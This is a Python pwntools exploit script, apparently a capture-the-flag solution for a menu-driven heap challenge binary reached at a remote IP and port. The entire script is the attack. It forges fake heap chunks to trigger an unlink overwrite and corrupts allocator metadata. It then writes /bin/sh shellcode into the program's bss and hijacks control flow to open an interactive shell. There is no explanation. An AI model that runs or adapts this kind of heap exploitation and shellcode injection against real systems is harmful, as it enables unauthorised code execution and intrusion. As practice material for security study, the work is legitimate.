from pwn import *
context(arch='amd64', log_level='debug')

elf = ELF('./pwn')
libc = ELF('./libc-2.23.so')

# io = process('./pwn')
io = remote('111.200.241.244', 54052)

def create(size, content):
	io.sendlineafter(b'Your choice :', b'1')
	io.sendlineafter(b'Size: ', str(size).encode())
	io.sendafter(b'Data: ', content)

def delete(index):
	io.sendlineafter(b'Your choice :', b'2')
	io.sendlineafter(b'Index: ', str(index).encode())

def update(index, size, content):
	io.sendlineafter(b'Your choice :', b'3')
	io.sendlineafter(b'Index: ', str(index).encode())
	io.sendlineafter(b'Size: ', str(size).encode())
	io.sendafter(b'Data: ', content)

bss = 0x601020
buf = 0x601040

create(0x90, b'a')
create(0x90, b'b')

payload = p64(0) + p64(0x91) + p64(buf-0x18) + p64(buf-0x10) + \
		  p64(0) * 14 + p64(0x90) + p64(0xA0)
update(0, len(payload), payload)

delete(1)

payload = p64(0) * 3 + p64(bss) + p64(buf) + p64(0) * 3 + p64(0x20)
update(0, len(payload), payload)

create(0x100, b'c')
create(0x100, b'd')

delete(2)
payload = p64(0) + p64(buf + 0x20)
update(2, len(payload), payload)

create(0x100, b'e')
payload = p64(bss) + p64(buf) + p64(0) * 4 + b'\x10'
update(1, len(payload), payload)

shellcode = asm(shellcraft.sh())
update(0, len(shellcode), shellcode)
update(6, 8, p64(bss))

io.sendline(b'1')
io.sendline(b'1')

io.interactive()